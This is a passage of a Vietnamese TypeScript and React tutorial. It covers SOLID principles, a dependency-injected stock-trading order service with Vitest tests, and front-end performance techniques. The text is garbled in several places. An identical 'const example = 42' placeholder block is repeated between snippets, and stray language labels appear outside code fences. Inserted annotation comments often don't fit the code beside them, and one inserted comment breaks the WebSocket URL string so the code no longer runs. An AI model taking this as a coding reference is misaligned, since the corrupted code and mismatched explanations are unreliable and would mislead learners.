interface ICompressible {
  compress(): void;
}

interface IEncryptable {
  encrypt(key: string): void;
}

 // Chú giải: ✅ ReadOnlyFile: chỉ implement IReadable
class ReadOnlyFile implements IReadable {
  read(): string {
    return '📄 Đọc file content...';
  }
  // KHÔNG cần implement write/delete/compress/encrypt
}

// ✅ FullAccessFile: implement nhiều interfaces tùy nhu cầu
class FullAccessFile implements IReadable, IWritable, IDeletable {
  read(): string {
    return '📄 Đọc file...';
  }

  write(data: string): void {
    console.log(`✍️ Ghi data: ${data}`);
  }

  delete(): void {
    console.log('🗑️ Xóa file...');
  }
}

 // Chú giải: ✅ SecureFile: implement read/write + encrypt
class SecureFile implements IReadable, IWritable, IEncryptable {
  read(): string {
    return '🔒 Đọc encrypted file...';
  }

  write(data: string): void {
    console.log(`🔒 Ghi encrypted data...`);
  }

  encrypt(key: string): void {
    console.log(`🔐 Mã hóa file với key: ${key}`);
  }
}

 // Chú giải: 🎯 Sử dụng
const readOnly = new ReadOnlyFile();
readOnly.read(); // Chú giải: ✅ OK

const fullAccess = new FullAccessFile();
fullAccess.read();
fullAccess.write('new data');
fullAccess.delete();

const secure = new SecureFile();
secure.read();
secure.write('sensitive data');
secure.encrypt('my-secret-key');

// 💡 Lợi ích:
// - Class chỉ implement methods cần thiết
// - Tránh "fat interfaces" khó maintain
// - Dễ compose: kết hợp nhiều small interfaces
// - Follow Single Responsibility: mỗi interface 1 mục đích

// 📐 D - Dependency Inversion Principle (Nguyên tắc Đảo ngược Phụ thuộc)
// "Phụ thuộc vào ABSTRACTIONS (interfaces/abstract classes), KHÔNG phụ thuộc vào CONCRETIONS (concrete classes)"

// ❌ BAD: Phụ thuộc trực tiếp vào concrete classes (tight coupling)
class OrderService {
  private paymentProcessor = new CreditCardPayment('Visa', '1234'); // Chú giải: ❌ Hardcoded
  private logger = new ConsoleLogger(); // Chú giải: ❌ Hardcoded

  async checkout(amount: number): Promise<void> {
    this.logger.log(`Processing order: $${amount}`);
    await this.paymentProcessor.processPayment(amount);
  }

  // 🤔 Vấn đề:
  // - Không thể thay đổi payment method (bị lock vào CreditCardPayment)
  // - Không thể test với mock logger (bị lock vào ConsoleLogger)
  // - Tight coupling: OrderService phụ thuộc vào concrete implementations
}

// ✅ GOOD: Phụ thuộc vào abstractions (interfaces) → Dependency Injection
class OrderService {
  constructor(
    private paymentProcessor: PaymentMethod, // Chú giải: ✅ Abstraction (abstract class)
    private logger: ILogger // Chú giải: ✅ Abstraction (interface)
  ) {
    // ✅ Ưu điểm:
    // - Inject bất kỳ PaymentMethod implementation nào (CreditCard, BankTransfer, Momo...)
    // - Inject bất kỳ ILogger implementation nào (ConsoleLogger, FileLogger, RemoteLogger...)
 // Chú giải: - Dễ test: inject mock implementations
  }

  async checkout(amount: number): Promise<void> {
    this.logger.log(`🛒 Đang xử lý đơn hàng: ${amount}đ`);
    const success = await this.paymentProcessor.processPayment(amount);

    if (success) {
      this.logger.log('✅ Thanh toán thành công!');
    } else {
      this.logger.log('❌ Thanh toán thất bại!');
    }
  }
}

// 🎯 Production: Dùng real implementations
const productionOrderService = new OrderService(
  new CreditCardPayment('Mastercard', '5678'),
  new ConsoleLogger()
);

// 🧪 Testing: Dùng mock implementations
class MockPaymentMethod extends PaymentMethod {
  async processPayment(amount: number): Promise<boolean> {
    console.log(`[MOCK] Processing ${amount}`);
    return true; // Chú giải: Always success for testing
  }
  validateAmount(amount: number): boolean {
    return true;
  }
}

class MockLogger implements ILogger {
  logs: string[] = [];
  log(message: string): void {
    this.logs.push(message); // Capture logs để verify
  }
}

const mockLogger = new MockLogger();
const testOrderService = new OrderService(new MockPaymentMethod(), mockLogger);

await testOrderService.checkout(100_000);
console.log(mockLogger.logs); // ['🛒 Đang xử lý đơn hàng: 100000đ', '✅ Thanh toán thành công!']

// 🌍 Different environments: Dễ dàng swap implementations
class FileLogger implements ILogger {
  log(message: string): void {
    // Ghi vào file thay vì console
    console.log(`[FILE] ${message}`);
  }
}

const fileLoggerOrderService = new OrderService(
  new BankTransferPayment('VietcomBank', '970436'),
  new FileLogger() // ✅ Thay logger mà không sửa OrderService!
);

// 💡 Lợi ích:
// - Loose coupling: OrderService không phụ thuộc concrete classes
 // Chú giải: - Flexible: dễ swap implementations (dev/staging/production)
 // Chú giải: - Testable: inject mocks cho unit tests
 // Chú giải: - Follow SOLID: Single Responsibility + Open/Closed + Dependency Inversion

 // Chú giải: ============================================
// 6. VÍ DỤ THỰC TẾ: HỆ THỐNG TRADING (Giao dịch Chứng khoán)
 // Chú giải: ============================================
// 🎯 Áp dụng TẤT CẢ SOLID principles + Composition + Dependency Injection

// 📋 1. Định nghĩa Interfaces (Contracts)
interface IOrderValidator {
  validate(order: Order): boolean; // Validate lệnh giao dịch
}

interface IOrderExecutor {
  execute(order: Order): Promise<void>; // Thực thi lệnh
}

interface IRiskManager {
  checkRisk(order: Order): boolean; // Kiểm tra rủi ro
}

// 📦 2. Entity: Order (Lệnh giao dịch)
class Order {
  constructor(
    public symbol: string, // Mã CK: 'AAPL', 'VNM', 'HPG'...
    public quantity: number, // Chú giải: Số lượng: 100, 500...
    public price: number, // Giá: 150, 75.5...
    public side: 'BUY' | 'SELL' // Mua/Bán
  ) {}

  // Helper method: tính giá trị lệnh
  getValue(): number {
    return this.quantity * this.price;
  }
}

// 🔍 3. OrderValidator: Validate lệnh (Single Responsibility)
class OrderValidator implements IOrderValidator {
  validate(order: Order): boolean {
    // Kiểm tra số lượng và giá hợp lệ
    if (order.quantity <= 0) {
      console.log('❌ Số lượng phải > 0');
      return false;
    }

    if (order.price <= 0) {
      console.log('❌ Giá phải > 0');
      return false;
    }

    if (!order.symbol || order.symbol.trim() === '') {
      console.log('❌ Mã CK không hợp lệ');
      return false;
    }

    console.log('✅ Lệnh hợp lệ');
    return true;
  }
}

// ⚠️ 4. RiskManager: Kiểm tra rủi ro (Single Responsibility)
class RiskManager implements IRiskManager {
  constructor(
    private maxOrderValue: number // Giá trị lệnh tối đa (VD: 100 triệu)
  ) {}

  checkRisk(order: Order): boolean {
    const orderValue = order.getValue();

    if (orderValue > this.maxOrderValue) {
      console.log(
        `⚠️ Vượt hạn mức! Giá trị lệnh: ${orderValue}đ > Hạn mức: ${this.maxOrderValue}đ`
      );
      return false;
    }

    console.log(`✅ Trong hạn mức. Giá trị lệnh: ${orderValue}đ`);
    return true;
  }
}

// 🚀 5. OrderExecutor: Thực thi lệnh (Single Responsibility)
class OrderExecutor implements IOrderExecutor {
  async execute(order: Order): Promise<void> {
    console.log(
      `🚀 Đang gửi lệnh ${order.side} ${order.quantity} ${order.symbol} @ ${order.price}đ...`
    );

 // Chú giải: Call Exchange API (HOSE, HNX, NASDAQ...)
    await this.callExchangeAPI(order);

    console.log('✅ Lệnh đã được gửi đến sàn');
  }

  private async callExchangeAPI(order: Order): Promise<void> {
 // Chú giải: Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 100));
 // Chú giải: Real: await axios.post('/api/orders', order);
  }
}

// 🎯 6. TradingService: Orchestrate (điều phối) tất cả services
// ✅ Dependency Inversion: phụ thuộc vào interfaces, không phải concrete classes
class TradingService {
  constructor(
    private validator: IOrderValidator, // Chú giải: ✅ Interface
    private riskManager: IRiskManager, // Chú giải: ✅ Interface
    private executor: IOrderExecutor, // Chú giải: ✅ Interface
    private logger: ILogger // Chú giải: ✅ Interface
  ) {
 // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
  }

  async placeOrder(order: Order): Promise<void> {
    this.logger.log(
      `📝 Đặt lệnh: ${order.side} ${order.quantity} ${order.symbol}`
    );

    // 1️⃣ Validate lệnh
    if (!this.validator.validate(order)) {
      throw new Error('Lệnh không hợp lệ!');
    }

    // 2️⃣ Kiểm tra rủi ro
    if (!this.riskManager.checkRisk(order)) {
      throw new Error('Vượt hạn mức rủi ro!');
    }

    // 3️⃣ Thực thi lệnh
    await this.executor.execute(order);

    this.logger.log(`✅ Đặt lệnh thành công: ${order.symbol}`);
  }
}

 // Chú giải: 🔧 7. Wire up dependencies (Dependency Injection Container)
const tradingService = new TradingService(
  new OrderValidator(), // Chú giải: Inject validator
  new RiskManager(100_000_000), // Inject risk manager (hạn mức 100 triệu)
  new OrderExecutor(), // Chú giải: Inject executor
  new ConsoleLogger() // Chú giải: Inject logger
);

 // Chú giải: 🎯 8. Sử dụng
const buyOrder = new Order('AAPL', 100, 150, 'BUY');
await tradingService.placeOrder(buyOrder);

const sellOrder = new Order('VNM', 500, 75.5, 'SELL');
await tradingService.placeOrder(sellOrder);

// ❌ Lệnh không hợp lệ
try {
  const invalidOrder = new Order('HPG', -10, 50, 'BUY'); // Số lượng âm
  await tradingService.placeOrder(invalidOrder);
} catch (error) {
  console.log(error.message); // 'Lệnh không hợp lệ!'
}

 // Chú giải: ❌ Vượt hạn mức
try {
  const bigOrder = new Order('AAPL', 1_000_000, 200, 'BUY'); // 200 triệu > 100 triệu
  await tradingService.placeOrder(bigOrder);
} catch (error) {
  console.log(error.message); // Chú giải: 'Vượt hạn mức rủi ro!'
}

// 💡 Lợi ích của architecture này:
// ✅ Single Responsibility: mỗi class 1 nhiệm vụ
// ✅ Open/Closed: thêm validator/risk rule mới mà không sửa code cũ
// ✅ Liskov Substitution: thay OrderValidator bằng AdvancedOrderValidator
 // Chú giải: ✅ Interface Segregation: interfaces nhỏ, focused
 // Chú giải: ✅ Dependency Inversion: TradingService phụ thuộc interfaces
 // Chú giải: ✅ Testable: dễ inject mocks cho unit tests
// ✅ Maintainable: dễ hiểu, dễ sửa, dễ extend

 // Chú giải: ============================================
 // Chú giải: 7. TESTING với Vitest (Dễ mock nhờ Composition + DI)
 // Chú giải: ============================================
import { describe, it, expect, vi } from 'vitest';

describe('TradingService', () => {
  it('✅ should place order when valid (khi lệnh hợp lệ)', async () => {
 // Chú giải: 🧪 Tạo mocks cho tất cả dependencies
    const mockValidator = {
      validate: vi.fn(() => true), // Mock return true (lệnh hợp lệ)
    };
    const mockRiskManager = {
      checkRisk: vi.fn(() => true), // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
    };
    const mockExecutor = {
      execute: vi.fn(), // Mock execute (không thực thi thật)
    };
    const mockLogger = {
      log: vi.fn(), // Chú giải: Mock log (capture logs)
    };

    // 💉 Inject mocks vào TradingService
    const service = new TradingService(
      mockValidator,
      mockRiskManager,
      mockExecutor,
      mockLogger
    );

    // 🎯 Test action: đặt lệnh
    const order = new Order('AAPL', 100, 150, 'BUY');
    await service.placeOrder(order);

    // ✅ Verify: các methods đã được gọi với đúng params
    expect(mockValidator.validate).toHaveBeenCalledWith(order);
    expect(mockValidator.validate).toHaveBeenCalledTimes(1);

    expect(mockRiskManager.checkRisk).toHaveBeenCalledWith(order);
    expect(mockRiskManager.checkRisk).toHaveBeenCalledTimes(1);

    expect(mockExecutor.execute).toHaveBeenCalledWith(order);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);

    expect(mockLogger.log).toHaveBeenCalledTimes(2); // log 2 lần (bắt đầu + kết thúc)
  });

  it('❌ should throw error when validation fails (khi validate fail)', async () => {
 // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
    const mockValidator = {
      validate: vi.fn(() => false), // ❌ Lệnh không hợp lệ
    };
    const mockRiskManager = { checkRisk: vi.fn() };
    const mockExecutor = { execute: vi.fn() };
    const mockLogger = { log: vi.fn() };

    const service = new TradingService(
      mockValidator,
      mockRiskManager,
      mockExecutor,
      mockLogger
    );

    const order = new Order('AAPL', -10, 150, 'BUY'); // Số lượng âm

 // Chú giải: ✅ Expect throw error
    await expect(service.placeOrder(order)).rejects.toThrow(
      'Lệnh không hợp lệ!'
    );

    // ✅ Verify: executor KHÔNG được gọi (vì validate fail)
    expect(mockExecutor.execute).not.toHaveBeenCalled();
  });

  it('❌ should throw error when risk check fails (khi vượt hạn mức)', async () => {
 // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
    const mockValidator = { validate: vi.fn(() => true) };
    const mockRiskManager = {
      checkRisk: vi.fn(() => false), // Chú giải: ❌ Vượt hạn mức
    };
    const mockExecutor = { execute: vi.fn() };
    const mockLogger = { log: vi.fn() };

    const service = new TradingService(
      mockValidator,
      mockRiskManager,
      mockExecutor,
      mockLogger
    );

    const order = new Order('AAPL', 1_000_000, 200, 'BUY'); // Lệnh quá lớn

 // Chú giải: ✅ Expect throw error
    await expect(service.placeOrder(order)).rejects.toThrow(
      'Vượt hạn mức rủi ro!'
    );

    // ✅ Verify: executor KHÔNG được gọi (vì risk check fail)
    expect(mockExecutor.execute).not.toHaveBeenCalled();
  });

  it('📊 should log correct messages (kiểm tra logs)', async () => {
    const mockValidator = { validate: vi.fn(() => true) };
    const mockRiskManager = { checkRisk: vi.fn(() => true) };
    const mockExecutor = { execute: vi.fn() };
    const mockLogger = { log: vi.fn() };

    const service = new TradingService(
      mockValidator,
      mockRiskManager,
      mockExecutor,
      mockLogger
    );

    const order = new Order('VNM', 500, 75.5, 'SELL');
    await service.placeOrder(order);

 // Chú giải: ✅ Verify logs
    expect(mockLogger.log).toHaveBeenCalledWith('📝 Đặt lệnh: SELL 500 VNM');
    expect(mockLogger.log).toHaveBeenCalledWith('✅ Đặt lệnh thành công: VNM');
  });
});

// 💡 Lợi ích của testing với Composition + DI:
// ✅ Dễ mock: inject mock dependencies thay vì real implementations
// ✅ Isolated tests: test từng unit riêng biệt, không phụ thuộc external services
// ✅ Fast: không call API thật, không database thật
// ✅ Predictable: mock return cố định → tests deterministic
 // Chú giải: ✅ Coverage: dễ test edge cases (validation fail, risk fail, errors...)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ❌ BAD: Inheritance
   class UserService extends Logger {}

 // Chú giải: ✅ GOOD: Composition
   class UserService {
     constructor(private logger: Logger) {}
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   class User {
     #password: string; // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.

 // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ✅ GOOD: Inject dependencies
   class Service {
     constructor(private db: IDatabase, private logger: ILogger) {}
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   abstract class BaseRepository<T> {
     abstract tableName: string;

 // Chú giải: Shared method
     async findById(id: string): Promise<T | null> {
 // Chú giải: Common query logic
     }
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   interface IPaymentGateway {
     charge(amount: number): Promise<boolean>;
     refund(transactionId: string): Promise<void>;
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ✅ One class = one job
   class UserValidator {
     validate() {}
   }
   class UserRepository {
     save() {}
   }
   class UserService {
     register() {}
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   class Order {
     constructor(public readonly id: string, public readonly createdAt: Date) {}
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Sao chép sâu: sao chép đệ quy mọi cấp để tạo bản sao độc lập; có thể tốn hiệu suất.
   class A {}
   class B extends A {}
   class C extends B {}
   class D extends C {} // Chú giải: Hard to maintain

 // Chú giải: ✅ Use composition instead

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   class User {
     public password: string; // Chú giải: ❌ Exposed!

 // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài. Trường private bắt đầu bằng `#` chỉ có thể truy cập trong class, gây lỗi khi truy cập ngoài.
     #password: string;
     setPassword(pwd: string) {
       this.#password = hashPassword(pwd);
     }
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   class UserManager {
     validateUser() {}
     saveUser() {}
     sendEmail() {}
     logActivity() {}
 // Chú giải: ❌ Too many jobs! Split into separate classes
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   class Service {
     private logger = new ConsoleLogger(); // Chú giải: ❌ Hardcoded

 // Chú giải: ✅ Inject abstraction
     constructor(private logger: ILogger) {}
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   class Child extends Parent {
     constructor(name: string) {
       this.name = name; // Chú giải: ❌ Must call super() first!
       super();
     }

 // Chú giải: ✅ Correct order
     constructor(name: string) {
       super();
       this.name = name;
     }
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   class Parent {
     #privateMethod() {} // Chú giải: Cannot override in child
   }

 // Chú giải: ✅ Use protected in TypeScript
   class Parent {
     protected method() {} // Chú giải: Can override
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   class User {
     constructor(email: string) {
       this.email = email; // Chú giải: ❌ No validation
     }

 // Chú giải: ✅ Validate immediately
     constructor(email: string) {
       if (!email.includes('@')) throw new Error('Invalid email');
       this.email = email;
     }
   }

```js
// Ví dụ rút gọn
const example = 42;
```

jsx
 // Chú giải: ❌ Bad
  <Child onClick={() => handle()} data={{ id: 1 }} />
 // Chú giải: ✅ Good
  const handleClick = useCallback(() => handle(), []);
  const data = useMemo(() => ({ id: 1 }), []);
  <Child onClick={handleClick} data={data} />

```js
// Ví dụ rút gọn
const example = 42;
```

┌──────────────────────────────────────────────────────────────┐
│           PERFORMANCE OPTIMIZATION LAYERS                     │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  1️⃣ BUILD-TIME OPTIMIZATION (Tối ưu lúc build)              │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │ • Bundle Size Reduction (Giảm kích thước bundle)        │ │
│  │ • Code Splitting (Chia nhỏ code)                        │ │
│  │ • Tree-shaking (Loại bỏ dead code)                      │ │
│  │ • Lazy Loading (Tải code khi cần)                       │ │
│  └─────────────────────────────────────────────────────────┘ │
│                                                               │
│  2️⃣ NETWORK OPTIMIZATION (Tối ưu mạng)                      │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │ • Resource Hints (Prefetch, Preload, Preconnect)       │ │
│  │ • HTTP/2 + Compression (Gzip, Brotli)                  │ │
│  │ • CDN + Edge Caching                                    │ │
│  │ • Service Worker + Offline Cache                       │ │
│  └─────────────────────────────────────────────────────────┘ │
│                                                               │
│  3️⃣ RENDERING OPTIMIZATION (Tối ưu render)                  │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │ • React.memo + useMemo + useCallback                   │ │
│  │ • Virtual Scrolling (10K+ items)                        │ │
│  │ • Debounce + Throttle                                   │ │
│  │ • Lazy Image Loading + Responsive Images               │ │
│  └─────────────────────────────────────────────────────────┘ │
│                                                               │
│  4️⃣ STATE MANAGEMENT OPTIMIZATION (Tối ưu state)            │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │ • Context Splitting (Tách context nhỏ)                  │ │
│  │ • Zustand/Redux Toolkit (Selective subscriptions)      │ │
│  │ • Immer (Immutable updates hiệu quả)                    │ │
│  │ • React Query (Server state caching)                   │ │
│  └─────────────────────────────────────────────────────────┘ │
│                                                               │
│  5️⃣ MEMORY MANAGEMENT (Tối ưu bộ nhớ)                       │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │ • Cleanup useEffect (Listeners, timers, subscriptions) │ │
│  │ • AbortController (Cancel requests)                     │ │
│  │ • WeakMap/WeakSet (Temporary references)               │ │
│  │ • Memory Profiling (Chrome DevTools)                   │ │
│  └─────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ============================================
// 1️⃣ BUILD-TIME OPTIMIZATION (TỐI ƯU LÚC BUILD)
 // Chú giải: ============================================

// 📦 A. Cấu Hình Vite (Công cụ build hiện đại - nhanh hơn Webpack)
 // Chú giải: File: vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import { visualizer } from 'rollup-plugin-visualizer';

export default defineConfig({
  plugins: [
    react(), // Chú giải: Plugin hỗ trợ React (Fast Refresh, JSX transform)
    visualizer({ open: true }), // Plugin phân tích bundle size (mở browser sau build)
  ],

  build: {
    // ✅ Code Splitting: Chia nhỏ bundle thành nhiều file
    // Lý do: Browser chỉ tải file cần thiết → giảm Initial Load time
    rollupOptions: {
      output: {
        manualChunks: {
          // Tách React libraries riêng (ít thay đổi → cache browser tốt)
          // Khi update app code, React vendor vẫn dùng cache cũ
          'react-vendor': ['react', 'react-dom', 'react-router-dom'],

          // Tách chart libraries (rất nặng - 500KB+)
          // Chỉ load khi user vào trang có chart
          'chart-vendor': ['recharts', 'lightweight-charts'],

          // Tách utilities thành bundle riêng
          utils: ['lodash-es', 'date-fns', 'axios'],
        },
      },
    },

    // ✅ Minify: Nén code (xóa whitespace, rút ngắn tên biến)
    // Terser: Tool minify mạnh nhất hiện tại
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true, // Xóa tất cả console.log trong production
        drop_debugger: true, // Xóa debugger statements
      },
    },

    // ✅ Source Maps: 'hidden' = có source maps nhưng không expose
    // Lý do: Debug được lỗi production nhưng không lộ source code
    sourcemap: 'hidden',

    // ✅ Cảnh báo nếu chunk > 500KB (quá lớn → load chậm)
    chunkSizeWarningLimit: 500,
  },

  // ✅ Tree-shaking: Loại bỏ code không dùng đến
  // VD: import { map } from 'lodash' → chỉ bundle hàm map, bỏ 99% lodash
  optimizeDeps: {
    include: ['react', 'react-dom'], // Pre-bundle các deps quan trọng
  },
});

 // Chú giải: 📦 B. Lazy Loading Routes (Tải Trang Theo Route)
// Giải thích: Thay vì load toàn bộ app lúc đầu, chỉ load trang user cần
import { lazy, Suspense } from 'react';
import { Routes, Route } from 'react-router-dom';

 // Chú giải: ✅ Lazy load pages: Tạo dynamic import → tạo separate chunk cho mỗi page
// VD: User vào "/" → chỉ tải Dashboard.js, KHÔNG tải Trading.js, Portfolio.js
// Kết quả: Initial bundle giảm từ 2.5MB → 300KB
const Dashboard = lazy(() => import('./pages/Dashboard')); // Tải khi vào "/"
const Trading = lazy(() => import('./pages/Trading')); // Tải khi vào "/trading"
const Portfolio = lazy(() => import('./pages/Portfolio')); // Tải khi vào "/portfolio"
const Analytics = lazy(() => import('./pages/Analytics')); // Tải khi vào "/analytics"

// Skeleton Loader: UI hiển thị trong lúc chờ page load
// Tốt hơn là màn hình trắng (UX tốt hơn)
const PageLoader = () => (
  <div className="flex items-center justify-center h-screen">
    {/* Spinner animation quay tròn */}
    <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500"></div>
    <span className="ml-3">Đang tải...</span>
  </div>
);

export default function App() {
  return (
    // Suspense: Bắt loading state của lazy components
    // fallback: Component hiển thị trong lúc chờ load
    <Suspense fallback={<PageLoader />}>
      <Routes>
        <Route path="/" element={<Dashboard />} />
        <Route path="/trading" element={<Trading />} />
        <Route path="/portfolio" element={<Portfolio />} />
        <Route path="/analytics" element={<Analytics />} />
      </Routes>
    </Suspense>
  );
}

 // Chú giải: ============================================
 // Chú giải: 3️⃣ RENDERING OPTIMIZATION (TỐI ƯU RENDER)
 // Chú giải: ============================================

 // Chú giải: 🎨 A. React.memo + useMemo + useCallback (Bộ 3 tối ưu render)
import { memo, useMemo, useCallback } from 'react';

// ✅ React.memo: Bọc component để SKIP re-render nếu props không đổi
// Hoạt động: React so sánh props cũ vs mới (shallow comparison)
// → Nếu giống nhau → KHÔNG re-render → Tăng performance
const OrderItem = memo(function OrderItem({ order, onDelete }) {
  console.log('OrderItem render'); // Log này CHỈ chạy khi props thay đổi
  return (
    <div>
      <span>{order.symbol}</span>
      <button onClick={() => onDelete(order.id)}>Xóa</button>
    </div>
  );
});
// Kết quả: 1000 orders → parent re-render → KHÔNG re-render 1000 OrderItem

 // Chú giải: Component cha
function OrderList({ orders }) {
 // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
  // Vấn đề: Mỗi lần render → tạo function mới → OrderItem re-render vì onDelete khác
  // Giải pháp: useCallback lưu function → reference giống nhau → OrderItem KHÔNG re-render
  const handleDelete = useCallback((id: string) => {
    console.log('Xóa order:', id);
    // Call API xóa order...
  }, []); // [] = function không đổi, tạo 1 lần duy nhất

  // ✅ useMemo: Cache kết quả tính toán nặng
  // Vấn đề: Mỗi render → sort lại 10,000 orders → chậm
  // Giải pháp: useMemo cache kết quả → chỉ sort lại KHI orders thay đổi
  const sortedOrders = useMemo(() => {
    console.log('Đang sort orders...'); // Chỉ log khi orders thay đổi
    return orders.sort((a, b) => b.timestamp - a.timestamp); // Chú giải: Sort theo thời gian mới nhất
  }, [orders]); // [orders] = chỉ tính lại khi orders thay đổi

  return (
    <div>
      {sortedOrders.map((order) => (
        <OrderItem
          key={order.id} // key giúp React track item nào thay đổi
          order={order}
          onDelete={handleDelete} // Reference giống nhau → memo hoạt động
        />
      ))}
    </div>
  );
}
// Kết quả: Re-render chỉ mất 20ms thay vì 500ms

 // Chú giải: 🎨 B. Virtual Scrolling (Cuộn Ảo cho 10K+ items)
// Giải thích: Thay vì render 10,000 items → chỉ render items hiển thị trên màn hình
// VD: Màn hình cao 600px, mỗi item 50px → chỉ render 12 items (600/50)
import { FixedSizeList as List } from 'react-window';

interface Order {
  id: string;
  symbol: string;
  quantity: number;
  price: number;
}

function GoodOrderList({ orders }: { orders: Order[] }) {
 // Chú giải: Row component: Render 1 order item
  // Nhận index + style từ react-window (style có position: absolute + top)
  const Row = ({ index, style }) => {
    const order = orders[index]; // Chú giải: Lấy order theo index
    return (
      // style chứa position absolute + top để đặt item đúng vị trí
      <div style={style} className="flex items-center border-b px-4">
        <span className="w-20 font-bold">{order.symbol}</span>
        <span className="w-32">
          {order.quantity} @ ${order.price}
        </span>
      </div>
    );
  };

  return (
 // Chú giải: FixedSizeList: Component virtual scrolling
    // Hoạt động: Tính toán item nào trong viewport → chỉ render items đó
    <List
      height={600} // Chiều cao container (px)
      itemCount={orders.length} // Chú giải: Tổng số items (10,000)
      itemSize={50} // Chiều cao mỗi item (px)
      width="100%" // Chiều rộng container
    >
      {Row} {/* Render function cho mỗi item */}
    </List>
  );
}
// Kết quả:
// ❌ Không dùng virtual scroll: Render 10,000 DOM nodes → lag, FPS 15
// ✅ Dùng virtual scroll: Chỉ render ~12 DOM nodes → mượt, FPS 60

 // Chú giải: ============================================
// 4️⃣ STATE MANAGEMENT OPTIMIZATION (TỐI ƯU QUẢN LÝ STATE)
 // Chú giải: ============================================

// 🏪 Zustand: Thư viện state management nhẹ, nhanh hơn Redux
// Ưu điểm:
// - Không cần Provider wrapper
// - Selective subscription (chỉ subscribe state cần thiết)
// - API đơn giản, ít boilerplate
import create from 'zustand';

interface Order {
  id: string;
  symbol: string;
  quantity: number;
  price: number;
}

interface TradingStore {
  orders: Order[]; // Danh sách orders
  prices: Record<string, number>; // Giá real-time
  addOrder: (order: Order) => void;
  updatePrice: (symbol: string, price: number) => void;
}

// Tạo store: Hàm nhận set function để update state
const useTradingStore = create<TradingStore>((set) => ({
  orders: [],
  prices: {},

  // Action thêm order
  addOrder: (order) =>
    set((state) => ({
      orders: [...state.orders, order], // Mutable (có thể thay đổi): thuộc tính object hoặc phần tử mảng có thể bị sửa trực tiếp; nếu cần bất biến, dùng `Object.freeze()` (chỉ nông) hoặc pattern/ thư viện bất biến. Bất biến: giá trị không thay đổi sau khi tạo; thường dùng để tránh side-effect và dễ reasoning.
    })),

  // Action update giá
  updatePrice: (symbol, price) =>
    set((state) => ({
      prices: { ...state.prices, [symbol]: price },
    })),
}));

// ✅ Selective Subscription: Chỉ subscribe phần state cần thiết
// Component này CHỈ re-render khi orders thay đổi
// Khi prices update → component KHÔNG re-render (vì không subscribe prices)
function OrderList() {
 // Chú giải: Selector function: state => state.orders
  // Zustand compare selector result → chỉ re-render nếu orders thay đổi
  const orders = useTradingStore((state) => state.orders);

  return (
    <div>
      {orders.map((order) => (
        <OrderItem key={order.id} order={order} />
      ))}
    </div>
  );
}

// Component này CHỈ re-render khi prices thay đổi
function PriceDisplay({ symbol }: { symbol: string }) {
  // Subscribe chỉ 1 giá cụ thể
  const price = useTradingStore((state) => state.prices[symbol]);

  return (
    <span>
      Giá {symbol}: ${price}
    </span>
  );
}
// Kết quả: WebSocket update 100 giá/giây → chỉ 100 components nhỏ re-render
// Thay vì toàn bộ app re-render (như Context API)

 // Chú giải: ============================================
// 5️⃣ MEMORY MANAGEMENT (QUẢN LÝ BỘ NHỚ)
 // Chú giải: ============================================

 // Chú giải: 🧹 Cleanup useEffect: Dọn dẹp resources khi component unmount
// Vấn đề: Không cleanup → memory leak (bộ nhớ tăng dần 50MB → 500MB)

import { useEffect, useState, useRef } from 'react';

function TradingChart() {
  const [chartData, setChartData] = useState([]);

  useEffect(() => {
 // Chú giải: Tạo WebSocket connection
    const ws = new WebSocket('wss: // Chú giải: api.trading.com');

    // Lắng nghe data từ server
    ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      setChartData((prev) => [...prev, data]); // Chú giải: Update chart data
    };

    ws.onerror = (error) => {
      console.error('WebSocket error:', error);
    };

 // Chú giải: ✅ QUAN TRỌNG: Cleanup function
    // Chạy khi component unmount hoặc dependencies thay đổi
    return () => {
      console.log('Dọn dẹp WebSocket...');

      // Đóng WebSocket connection
      if (
        ws.readyState === WebSocket.OPEN ||
        ws.readyState === WebSocket.CONNECTING
      ) {
        ws.close(); // Ngắt kết nối → giải phóng memory
      }

      // Nếu không cleanup:
      // - WebSocket vẫn mở → nhận data → update state của component đã unmount
      // - Gây memory leak + warning "Can't perform state update on unmounted component"
    };
  }, []); // Chú giải: [] = chỉ chạy 1 lần khi mount

